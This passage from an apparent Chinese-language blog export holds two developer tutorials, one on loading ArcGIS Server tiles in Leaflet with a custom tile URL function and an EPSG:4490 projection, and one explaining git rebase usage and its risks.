<h2 id="使用-ArcGIS-瓦片地图"><a href="#使用-ArcGIS-瓦片地图" class="headerlink" title="使用 ArcGIS 瓦片地图"></a>使用 ArcGIS 瓦片地图</h2><h3 id="leaflet-解析规则"><a href="#leaflet-解析规则" class="headerlink" title="leaflet 解析规则"></a>leaflet 解析规则</h3><p>leaflet 的 TileLayer 通过内部的 getTileUrl 回调方法去获取瓦片路径，getTileUrl 会传入一个对象，对象中包含地图层级 z，瓦片横坐标 x，瓦片纵坐标 y。这些数据都为十进制数，与 ArcGIS 的瓦片解析规则不一致。</p>
<h3 id="ArcGIS-瓦片路径"><a href="#ArcGIS-瓦片路径" class="headerlink" title="ArcGIS 瓦片路径"></a>ArcGIS 瓦片路径</h3><p>ArcGIS Server 切片后路径规则如下：</p>
<ul>
<li>__alllayers<ul>
<li>L00<ul>
<li>R00000000<ul>
<li>C00000000.png</li>
<li>C0000000f.png</li>
</ul>
</li>
<li>R0000001f</li>
</ul>
</li>
<li>L21</li>
<li>Conf.xml</li>
</ul>
</li>
</ul>
<p>可以看出 ArcGIS Server 切片规则：</p>
<ol>
<li>最外层为__alllayers 文件夹;</li>
<li>L 为地图层级文件夹，固定为 L 字母加两位十进制数，0-9 这种不足两位的层级，前面补 0;</li>
<li>R 为瓦片纵坐标，固定为 R 字母加八位十六进制数，不足八位的，前面补 0;</li>
<li>C 为瓦片横坐标，固定为 C 字母加八位十六进制数，不足八位的，前面补 0;</li>
<li>Conf.xml 为配置文件，包含了瓦片的投影方式，原点坐标，分辨率等参数;</li>
</ol>
<span id="more"></span>

<h3 id="扩展-leaflet-TileLayer"><a href="#扩展-leaflet-TileLayer" class="headerlink" title="扩展 leaflet.TileLayer"></a>扩展 leaflet.TileLayer</h3><p>了解了 leaflet 解析规则与 ArcGIS 瓦片规则的差别，就可以扩展 leaflet.TileLayer 类，自定义瓦片解析规则了。</p>
<pre class="line-numbers language-ts" data-language="ts"><code class="language-ts"><span class="token comment">// 瓦片加载扩展类</span>
<span class="token keyword">const</span> ArcGisServerTileLoad <span class="token operator">=</span> <span class="token constant">L</span><span class="token punctuation">.</span>TileLayer<span class="token punctuation">.</span><span class="token function">extend</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
  <span class="token comment">// 扩展L.TileLayer类</span>
  <span class="token function-variable function">getTileUrl</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>tilePoint<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">// 地图层级</span>
    <span class="token keyword">let</span> zz <span class="token operator">=</span> tilePoint<span class="token punctuation">.</span>z<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// 添加字母L并补0</span>
    zz <span class="token operator">=</span> <span class="token string">"L"</span> <span class="token operator">+</span> <span class="token string">"00"</span><span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span> <span class="token operator">-</span> zz<span class="token punctuation">.</span>length<span class="token punctuation">)</span> <span class="token operator">+</span> zz<span class="token punctuation">;</span>
    <span class="token comment">// 初始8位16进制数</span>
    <span class="token keyword">const</span> initCR <span class="token operator">=</span> <span class="token string">"00000000"</span><span class="token punctuation">;</span>
    <span class="token comment">// 瓦片横坐标，10进制转16进制</span>
    <span class="token keyword">let</span> xx <span class="token operator">=</span> tilePoint<span class="token punctuation">.</span>x<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// 添加字母并补0</span>
    xx <span class="token operator">=</span> <span class="token string">"C"</span> <span class="token operator">+</span> initCR<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">8</span> <span class="token operator">-</span> xx<span class="token punctuation">.</span>length<span class="token punctuation">)</span> <span class="token operator">+</span> xx<span class="token punctuation">;</span>
    <span class="token comment">// 瓦片纵坐标，10进制转16进制</span>
    <span class="token keyword">let</span> yy <span class="token operator">=</span> tilePoint<span class="token punctuation">.</span>y<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// 添加字母并补0</span>
    yy <span class="token operator">=</span> <span class="token string">"R"</span> <span class="token operator">+</span> initCR<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">8</span> <span class="token operator">-</span> yy<span class="token punctuation">.</span>length<span class="token punctuation">)</span> <span class="token operator">+</span> yy<span class="token punctuation">;</span>
    <span class="token comment">// 使用leaflet模板将各变量转换为路径字符串并返回</span>
    <span class="token keyword">return</span> <span class="token constant">L</span><span class="token punctuation">.</span>Util<span class="token punctuation">.</span><span class="token function">template</span><span class="token punctuation">(</span>
      <span class="token keyword">this</span><span class="token punctuation">.</span>_url<span class="token punctuation">,</span>
      <span class="token constant">L</span><span class="token punctuation">.</span><span class="token function">extend</span><span class="token punctuation">(</span>
        <span class="token punctuation">&#123;</span>
          s<span class="token operator">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">_getSubdomain</span><span class="token punctuation">(</span>tilePoint<span class="token punctuation">)</span><span class="token punctuation">,</span>
          z<span class="token operator">:</span> zz<span class="token punctuation">,</span>
          x<span class="token operator">:</span> xx<span class="token punctuation">,</span>
          y<span class="token operator">:</span> yy<span class="token punctuation">,</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>options
      <span class="token punctuation">)</span>
    <span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// 生成瓦片实例函数</span>
<span class="token keyword">const</span> <span class="token function-variable function">arcGisServerTileLayer</span> <span class="token operator">=</span> <span class="token punctuation">(</span>url<span class="token operator">:</span> <span class="token builtin">string</span><span class="token punctuation">,</span> options<span class="token operator">?</span><span class="token operator">:</span> <span class="token constant">L</span><span class="token punctuation">.</span>TileLayerOptions<span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">ArcGisServerTileLoad</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> options<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
<span class="token comment">// 使用ArcGIS瓦片</span>
<span class="token comment">// 注意这里顺序为z、y、x，而不是z、x、y；map为leaflet的map实例</span>
<span class="token function">arcGisServerTileLayer</span><span class="token punctuation">(</span><span class="token string">"http://www.map-example.com/__alllayers/&#123;z&#125;/&#123;y&#125;/&#123;x&#125;.png"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addTo</span><span class="token punctuation">(</span>map<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="坐标系投影"><a href="#坐标系投影" class="headerlink" title="坐标系投影"></a>坐标系投影</h2><p>将瓦片解析规则调整为 ArcGIS 的解析规则后，发现瓦片地图仍然无法加载，排查原因后发现是瓦片的投影坐标系与 leaflet 地图引擎投影坐标系不同造成的。瓦片使用了 2000 国家大地坐标系，而 leaflet 默认只有 4326 与 3857 两种默认投影。</p>
<h3 id="相关概念"><a href="#相关概念" class="headerlink" title="相关概念"></a>相关概念</h3><ul>
<li><p>EPSG：European Petroleum Survey Group，欧洲石油调查组织，最初由 EPSG 在 1985 年创建了地理参数数据集，并在 1993 年公开。2005 年 EPSG 并入国际油气生产者协会（IOGP），并入 IOGP 后，为避免混淆，数据集仍延用 EPSG 的名称，并由 IOGP 维护，后来 EPSG 就更多代指该数据集名称了。EPSG 编码介于 1024 至 32767 之间，每种地图投影都被分配了一个编码，该编码作为一种众所周知的机器可读的标准化文本存在，如<code>EPSG: 4326</code>。EPSG 数据集可以通过网站<a href="https://epsg.io/">https:epsg.io</a>查看。</p>
</li>
<li><p>EPSG:4326 - WGS 84（world geodetic system 1984）即 世界大地测量系统 1984，广泛用于 GPS 定位等;</p>
</li>
<li><p>EPSG:3857 - Web Mercator Projection 网络墨卡托投影，常用于网络地图，如 Google Maps、OpenStreetMap;</p>
</li>
<li><p>EPSG:7789 - International Terrestrial Reference Frame 2014（ITRF2014）即 国际陆地参考系 2014;</p>
</li>
<li><p>EPSG:4490 - 2000 国家大地坐标系;</p>
</li>
</ul>
<h3 id="leaflet-使用-EPSG-4490-投影"><a href="#leaflet-使用-EPSG-4490-投影" class="headerlink" title="leaflet 使用 EPSG:4490 投影"></a>leaflet 使用 EPSG:4490 投影</h3><ul>
<li>安装并引入 proj4leaflet 插件;</li>
</ul>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">npm</span> <span class="token function">install</span> proj4leaflet<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token comment">// 如果有引入leaflet库，引入proj4leaflet后，会自动挂载为L.Proj</span>
<span class="token keyword">import</span> <span class="token string">"proj4leaflet"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<ul>
<li>通过[<a href="https://epsg.io]网站查询">https://epsg.io]网站查询</a> 4490 投影定义配置，下滑页面至导出功能，复制 Proj4js 版本的 4490 定义配置;</li>
</ul>
<pre class="line-numbers language-js" data-language="js"><code class="language-js">proj4<span class="token punctuation">.</span><span class="token function">defs</span><span class="token punctuation">(</span><span class="token string">"EPSG:4490"</span><span class="token punctuation">,</span> <span class="token string">"+proj=longlat +ellps=GRS80 +no_defs"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ul>
<li>查看瓦片目录下的 Conf.xml 文件，找到投影坐标系、原点信息、分辨率等信息;</li>
</ul>
<pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token comment">&lt;!-- WKT标签表示了投影的坐标系，用于在epsg.io网站上查询对应的epsg编码，例如该WKT表示EPSG:4490 --></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>WKT</span><span class="token punctuation">></span></span>GEOGCS["CGCS_2000",DATUM["D_2000",SPHEROID["S_2000",6378137.0,298.2572221010041]],PRIMEM["Greenwich",0.0],UNIT["Degree",0.0174532925199433]]<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>WKT</span><span class="token punctuation">></span></span>
<span class="token comment">&lt;!-- TileOrigin标签表示瓦片原点信息 --></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>TileOrigin</span> <span class="token attr-name"><span class="token namespace">xsi:</span>type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>typens:PointN<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>X</span><span class="token punctuation">></span></span>-180<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>X</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Y</span><span class="token punctuation">></span></span>90<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Y</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>TileOrigin</span><span class="token punctuation">></span></span>
<span class="token comment">&lt;!-- TileCols与TileRows标签表示瓦片大小 --></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>TileCols</span><span class="token punctuation">></span></span>256<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>TileCols</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>TileRows</span><span class="token punctuation">></span></span>256<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>TileRows</span><span class="token punctuation">></span></span>
<span class="token comment">&lt;!-- LODInfo中代表每个地图层级的信息 --></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>LODInfo</span> <span class="token attr-name"><span class="token namespace">xsi:</span>type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>typens:LODInfo<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
  <span class="token comment">&lt;!-- LevelID 地图层级 --></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>LevelID</span><span class="token punctuation">></span></span>0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>LevelID</span><span class="token punctuation">></span></span>
  <span class="token comment">&lt;!-- Scale 缩放 --></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Scale</span><span class="token punctuation">></span></span>73957338.863641396<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Scale</span><span class="token punctuation">></span></span>
  <span class="token comment">&lt;!-- Resolution 分辨率 --></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Resolution</span><span class="token punctuation">></span></span>0.17597860392101103<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Resolution</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>LODInfo</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<ul>
<li>根据上述信息，并使用 proj4leaflet 创建新的投影</li>
</ul>
<pre class="line-numbers language-ts" data-language="ts"><code class="language-ts"><span class="token comment">// 使用EPSG网站上复制出的4490配置</span>
<span class="token keyword">const</span> <span class="token constant">EPSG4490</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name"><span class="token constant">L</span></span><span class="token punctuation">.</span>Proj<span class="token punctuation">.</span><span class="token constant">CRS</span><span class="token punctuation">(</span><span class="token string">"EPSG:4490"</span><span class="token punctuation">,</span> <span class="token string">"+proj=longlat +ellps=GRS80 +no_defs"</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>
  <span class="token comment">// 使用Conf.xml中的resolution数据</span>
  resolutions<span class="token operator">:</span> <span class="token punctuation">[</span>
    <span class="token number">0.17597860392101103</span><span class="token punctuation">,</span> <span class="token number">0.087989301960505514</span><span class="token punctuation">,</span> <span class="token number">0.043994650980252757</span><span class="token punctuation">,</span> <span class="token number">0.021997325490126379</span><span class="token punctuation">,</span> <span class="token number">0.010998662745063191</span><span class="token punctuation">,</span>
    <span class="token number">0.0054993313725315955</span><span class="token punctuation">,</span> <span class="token number">0.0027496656862657978</span><span class="token punctuation">,</span> <span class="token number">0.0013748328431328989</span><span class="token punctuation">,</span> <span class="token number">0.00068741642156644944</span><span class="token punctuation">,</span>
  <span class="token punctuation">]</span><span class="token punctuation">,</span>
  <span class="token comment">// 使用Conf.xml中的origin数据</span>
  origin<span class="token operator">:</span> <span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">180</span><span class="token punctuation">,</span> <span class="token number">90</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// 加载地图时，使用4490投影</span>
<span class="token constant">L</span><span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token string">"map"</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>
  crs<span class="token operator">:</span> <span class="token constant">EPSG4490</span><span class="token punctuation">,</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
]]></content>
      <categories>
        <category>gis</category>
      </categories>
      <tags>
        <tag>gis</tag>
        <tag>leaflet</tag>
        <tag>4490</tag>
        <tag>arcgis</tag>
      </tags>
  </entry>
  <entry>
    <title>git命令之rebase</title>
    <url>/2021/07/07/git%E5%91%BD%E4%BB%A4%E4%B9%8Brebase/</url>
    <content><![CDATA[<h2 id="使用场景一：合并提交记录"><a href="#使用场景一：合并提交记录" class="headerlink" title="使用场景一：合并提交记录"></a>使用场景一：合并提交记录</h2><h3 id="一个功能有很多次-commit，会存在的问题"><a href="#一个功能有很多次-commit，会存在的问题" class="headerlink" title="一个功能有很多次 commit，会存在的问题"></a>一个功能有很多次 commit，会存在的问题</h3><ol>
<li><p>不利于代码 review，一个较小的功能却分为多次提交，review 时需要切换提交且不方便代码对比;</p>
</li>
<li><p>一旦线上环境出现问题，需要回滚代码时，大量的 commit 记录，也不方便查找。</p>
</li>
</ol>
<p>另外如果是在 github 上维护一个开源库，很多杂乱的提交记录也并不友好。使用 rebase 命令可以合并多次提交记录，使提交记录变得清晰整洁。</p>
<span id="more"></span>

<h3 id="合并提交记录的操作"><a href="#合并提交记录的操作" class="headerlink" title="合并提交记录的操作"></a>合并提交记录的操作</h3><ul>
<li>合并提交记录时，通常会使用 rebase 的交互模式，即<code>-i</code>参数（全称是<code>--interactive</code>参数), 表示提交记录的参数则有两种形式，一种是<code>HEAD~n</code>，表示操作倒数第 n 次提交<strong>及</strong>其后的所有提交（<code>HEAD~n</code>实际上表示的是第 n 代祖先提交，这里不考虑有分叉的情况，假设提交是一条线，如<code>HEAD~2</code>是第 2 代祖先提交，即倒数第三个提交，当前提交为<code>HEAD~0</code>，而 rebase 操作指的是<code>HEAD~2</code>后的提交，不包含<code>HEAD~2</code>，故为<code>HEAD~1</code>和<code>HEAD~0</code>，即倒数两次的提交）；还有一种是形如<code>0a93cf</code>的提交 hash 值，表示要操作的是<code>0a93cf</code>这个提交后（时间上）的所有提交，不包含<code>0a93cf</code>本身。</li>
</ul>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># rebase操作0a93cf后的所有提交</span>
<span class="token function">git</span> rebase -i 0a93cf
<span class="token comment"># rebase操作最近2次提交</span>
<span class="token function">git</span> rebase -i HEAD~2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<ul>
<li>执行完上面的命令后，会自动打开编辑器，内容如下：</li>
</ul>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 每个提交默认操作都是pick，可以使用下面注释中提示的缩写修改每个提交的操作</span>
pick 15447ca add: test2
s 1e12203 add: test4

<span class="token comment"># Rebase 0a93cfd..1e12203 onto 0a93cfd (2 commands)</span>
<span class="token comment">#</span>
<span class="token comment"># Commands:</span>
<span class="token comment"># p, pick &lt;commit> = use commit 使用该条提交</span>
<span class="token comment"># r, reword &lt;commit> = use commit, but edit the commit message 使用该条提交，但需要编辑提交信息</span>
<span class="token comment"># e, edit &lt;commit> = use commit, but stop for amending  使用该条提交，但需要暂停进程并修改代码</span>
<span class="token comment"># s, squash &lt;commit> = use commit, but meld into previous commit 使用该条提交，但合并入上一条提交；注意由于第一条没有上一条，故不能在第一条上使用s命令</span>
<span class="token comment"># f, fixup &lt;commit> = like "squash", but discard this commit's log message 与squash相似，但不保留提交信息</span>
<span class="token comment"># x, exec &lt;command> = run command (the rest of the line) using shell 需要执行shell命令</span>
<span class="token comment"># b, break = stop here (continue rebase later with 'git rebase --continue') 停止到这个提交，后续通过`git rebase --continue`命令继续</span>
<span class="token comment"># d, drop &lt;commit> = remove commit 丢弃该提交</span>
<span class="token comment"># l, label &lt;label> = label current HEAD with a name 给当前HEAD一个label名称</span>
<span class="token comment"># t, reset &lt;label> = reset HEAD to a label 将HEAD重置为某个label标签</span>
<span class="token comment"># m, merge [-C &lt;commit> | -c &lt;commit>] &lt;label> [# &lt;oneline>] 创建一个合并提交，使用原始合并提交信息</span>
<span class="token comment"># .       create a merge commit using the original merge commit's</span>
<span class="token comment"># .       message (or the oneline, if no original merge commit was</span>
<span class="token comment"># .       specified). Use -c &lt;commit> to reword the commit message.</span>
<span class="token comment">#</span>
<span class="token comment"># These lines can be re-ordered; they are executed from top to bottom.</span>
<span class="token comment">#</span>
<span class="token comment"># If you remove a line here THAT COMMIT WILL BE LOST.</span>
<span class="token comment">#</span>
<span class="token comment"># However, if you remove everything, the rebase will be aborted.</span>
<span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<ul>
<li><p>如果保存出现了错误或异常退出了编辑器，此时可以使用<code>git rebase --edit-todo</code>命令，重新打开编辑器。</p>
</li>
<li><p>如果有暂停 break 或修改代码 edit 等操作时，rebase 流程会暂停，需要使用<code>git rebase --continue</code>继续。</p>
</li>
<li><p>最后可以通过<code>git log</code>命令查看结果，发现提交记录已合并。</p>
</li>
<li><p>若想撤回 rebase 怎么办？log 中已经没有合并前的 hash 了。此时可以使用<code>git reflog</code>命令，查看所有操作记录找回 rebase 前的 hash，并通过<code>git reset</code>恢复到 rebase 前。</p>
</li>
</ul>
<h2 id="使用场景二：分支合并"><a href="#使用场景二：分支合并" class="headerlink" title="使用场景二：分支合并"></a>使用场景二：分支合并</h2><h3 id="merge-合并与-rebase-合并的区别"><a href="#merge-合并与-rebase-合并的区别" class="headerlink" title="merge 合并与 rebase 合并的区别"></a>merge 合并与 rebase 合并的区别</h3><p>通常我们使用<code>merge</code>命令进行分支合并，<code>merge</code>命令的一个显著特点是将两个分支的最新快照与他们最近的共同祖先进行三方合并，并将合并的结果生成一个新的快照，并以制式信息自动提交。</p>
<p>而<code>rebase</code>命令是将提交到某一分支上的所有修改都移至另一分支上，好像“重新播放”一样。</p>
<p>例如：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 检出至dev分支</span>
<span class="token function">git</span> checkout dev
<span class="token comment"># dev变基为master</span>
<span class="token function">git</span> rebase master<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>原理为先找到当前分支 dev 与目标基底分支 master 的最近共同祖先，然后对比当前分支 dev 相对于该祖先的历次提交，提取相应的修改并存为临时文件，然后将当前分支指向目标基底分支 master 的最新提交，最后基于 master 的最新提交将之前保存的临时文件依序应用提交。</p>
<p>使用 rebase 与 merge 在最终结果上没有本质的区别，只是 rebase 变基使得提交历史更加整洁。尽管实际的开发工作是并行的，但在 rebase 后的提交历史中，它们看起来像是串行的一样，提交历史是一条直线没有分叉。</p>
<h3 id="为什么使用-rebase-合并"><a href="#为什么使用-rebase-合并" class="headerlink" title="为什么使用 rebase 合并"></a>为什么使用 rebase 合并</h3><p>一般情况下，我们这样做的目的是为了确保在向远程分支推送功能时保持提交历史的整洁，尤其是向他人维护的项目贡献代码时。在这种情况下，你首先在自己的分支里进行开发，开发完成后你需要先将你的代码变基到<code>origin/master</code>上，然后再向主项目提交修改。这样，项目维护者就不再需要进行整合工作，只需要快进合并即可。</p>
<h3 id="更复杂的变基例子"><a href="#更复杂的变基例子" class="headerlink" title="更复杂的变基例子"></a>更复杂的变基例子</h3><h4 id="onto-参数"><a href="#onto-参数" class="headerlink" title="onto 参数"></a>onto 参数</h4><p>假设现在有三个分支：master、next、topic，三个分支关系如下：</p>
<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">o---o---o---o---o  master
     \
      o---o---o---o---o  next
                       \
                        o---o---o  topic<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>topic 分支基于 next 分支，但此时想要将 topic 分支的修改合并入 master 分支，但还不想合并 next 分支，那么可以执行命令<code>git rebase --onto master next topic</code>。</p>
<p>这个命令的意思是：取出 topic 分支，找出它从 next 分支分叉后的修改，然后把这些修改在 master 分支上重放一遍，让 topic 分支像直接基于 master 修改一样。</p>
<p>命令执行后的结果如下：</p>
<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">o---o---o---o---o  master
    |            \
    |             o'--o'--o'  topic
     \
      o---o---o---o---o  next<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="直接变基"><a href="#直接变基" class="headerlink" title="直接变基"></a>直接变基</h4><p>接下来，假设你决定将 next 分支也合并进 master 中，但你当前分支并不是 next 分支，那么使用<code>git rebase &lt;baseBranch&gt; &lt;topicBranch&gt;</code>命令即可，例如：<code>git rebase master next</code>，这个命令可以直接将主题分支（next）变基到目标分支（master）上。这样能省去切换到 next 分支再变基的步骤。</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 当前分支为topic，要合并next分支到master上</span>
<span class="token comment"># 方式1</span>
<span class="token function">git</span> rebase master next
<span class="token comment"># 方式2</span>
<span class="token function">git</span> checkout next
<span class="token function">git</span> rebase master<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="依靠-rebase-删除提交"><a href="#依靠-rebase-删除提交" class="headerlink" title="依靠 rebase 删除提交"></a>依靠 rebase 删除提交</h4><p>例如有如下提交记录：</p>
<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">E---F---G---H---I---J  topicA<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>执行命令<code>git rebase --onto topicA~5 topicA~3 topicA</code>，那么结果为：</p>
<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">E---H'---I'---J'  topicA<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>F 提交与 G 提交被删除了。这条命令的意思是：将 topicA 的所有提交基于 topicA 第三个祖先提交（G）的变化（H-I-J）提取出来，再以 topicA 第 5 个祖先提交（E）为基底变基，故 F、G 两个提交就通过变基的操作删除掉了。</p>
<h2 id="变基的风险"><a href="#变基的风险" class="headerlink" title="变基的风险"></a>变基的风险</h2><p>使用变基得遵守一条准则：<strong>如果提交已经存在于你的本地仓库之外（远程仓库），而别人可能已经基于这些提交进行开发，那么不要执行变基。如果一定要执行变基，那么请确保通知每一个人执行<code>git pull --rebase</code>命令。</strong></p>
<ul>
<li>例如你基于远程版本库 C1 进行开发，你在本地提交了 C2、C3。</li>
</ul>
<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">C1 origin/master 远程库
 \
  C2---C3 master 本地库<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<ul>
<li>远程库也有新的修改和合并提交。</li>
</ul>
<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">  ---C5---
 /        \
C1---C4---C6 origin/master 远程库<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<ul>
<li>你拉取了这些提交，并执行了合并提交。</li>
</ul>
<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">  ---C5---
 /        \
C1---C4---C6 origin/master 远程库
 \         \
  C2---C3---C7 master 本地库<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<ul>
<li>远程库的提交人将合并操作回滚，改用变基；又用<code>git push --force</code>强行覆盖了服务器上的提交历史。</li>
</ul>
<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">C1---C5---C4' origin/master<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ul>
<li>此时你再拉取服务器上的提交，你会多出来新的提交。而并不会删除服务器上已经删除的提交。</li>
</ul>
<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">  ---C5---C4' origin/master 远程库
 /       \    \
C1---C4---C6   \
 \         \    \
  C2---C3---C7---C8 master 本地库<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<ul>
<li>可以发现此时，你有两个一样的 C4 提交，如果你再将这样的版本库推送到服务器上，实际上是将那些已经被变基抛弃的提交（C4、C6）又找了回来。</li>
</ul>
<p>那么真的遇到这种情况怎么解决呢？我们已知远程分支被变基的情况下，可以手动拉取变更<code>git fetch</code>再执行变基<code>git rebase origin/master</code>，或者使用<code>git pull --rebase</code>而不是直接使用<code>git pull</code>。</p>
<p>如果习惯使用<code>git pull</code>，同时又希望默认使用<code>--rebase</code>选项，可以执行这条语句<code>git config --global pull.rebase true</code>来更改<code>pull.rebase</code>的默认配置。</p>
<h3 id="可参考的实践"><a href="#可参考的实践" class="headerlink" title="可参考的实践"></a>可参考的实践</h3><p>基于变基的风险，也有人总结出了一套实践原则，可以供大家参考：</p>
<ol>
<li>下游分支更新上游分支内容时，使用 rebase 合并;</li>
<li>上游分支更新下游分支内容时，使用 merge 合并;</li>
<li>当前分支拉取更新时，使用<code>--rebase</code>选项;</li>
</ol>
<blockquote>
<p>参考资料</p>
<p><a href="https://git-scm.com/book/zh/v2/Git-%E5%88%86%E6%94%AF-%E5%8F%98%E5%9F%BA">Git 分支-变基</a></p>
<p>Git 帮助文档<code>git rebase --help</code></p>
